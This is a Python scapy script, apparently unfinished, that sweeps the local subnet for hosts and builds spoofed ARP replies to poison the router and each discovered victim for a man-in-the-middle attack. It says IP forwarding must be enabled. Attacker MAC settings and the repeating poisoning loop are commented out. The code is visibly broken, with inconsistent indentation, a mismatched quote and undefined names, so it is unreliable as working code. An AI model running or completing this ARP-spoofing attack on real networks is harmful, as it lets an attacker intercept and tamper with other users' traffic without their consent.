from scapy.all import *
import time

# IP forwarding must be enabled.
class PrePreAttack(object):	
	def get_IP_Addrs(self, routerIP):
        num_Array = routerIP.split('.')
        arp_List = ".".join(num_Array[0:3])+".*" #this is to get the string in form "X.X.X.*"
		ans, unans = arping(arp_List)
        n = len(ans)
		IP_Addrs = []
		for i in range(0, n):
			IP_Addrs.append(ans[i][1].psrc)
		return IP_Addrs

#class PreAttack(object):
#	def __init__(self, target, interface):
#		self.target = target
#		self.interface = interface
#	def get_MAC_Addr(self):
#		return srp(Ether(dst="ff:ff:ff:ff:ff:ff')/ARP(pdst=self.target),timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc

class Attack(object):
	def __init__(self, router, targets, interface):
		self.router = router
		self.targets = targets 
		self.interface = interface
	def send_Poison(self, MACs):
		for i in range(0, len(targets)):
			#arp to spoof the victim, send to router
			arp1 = Ether() / ARP()
#			arp1[Ether].src = #attacking MAC address
#			arp1[ARP].hwsrc = #attacking MAC address
			arp1[ARP].psrc = self.targets[i] #IP to Spoof
			arp1[ARP].hwdst = MACs[0]
			arp1[ARP].pdst = self.router
			sendp(arp1, iface = self.interface)
			#arp to spoof the router, send to victim
			arp2 = Ether() / ARP()
#			arp2[Ether].src = #attacking MAC address
#			arp2[ARP].hwsrc = #attacking MAC address
			arp2[ARP].psrc = self.router #IP to Spoof
			arp2[ARP].hwdst = MACs[i]
			arp2[ARP].pdst = self.targets[i]
			sendp(arp2, iface = self.interface)


if __name__ == '__main__':
	import time
	from scapy.all import *
#	interface = #interface
#	my_macs = get_if_hwaddr(interface)
	IP_router = sr1(IP(dst = "www.wikipedia.org", ttl = 0)/ICMP()) #ttl = 0 to find the router with whom we connected
	print(IP_router.src)
	targets_IP = PrePreAttack().get_IP_Addrs(IP_router.src)
	print(targets_IP[0])
	targets_MAC = []
#	try:
#		for i in range(0, len(targets_IP)):
#			targets_MAC.append(PreAttack(targets_P[i], interface).get_MAC_Addr())
#	except Exception:
#		print '[Cannot find MAC addresses]'
#	
#	while True:
#		try:
#			Attacks(targets_IP, interface).send_Poison(targets_MAC)
#			sleep(3)
#		except Exception:
#			print '[Failed to send arp Poison]'
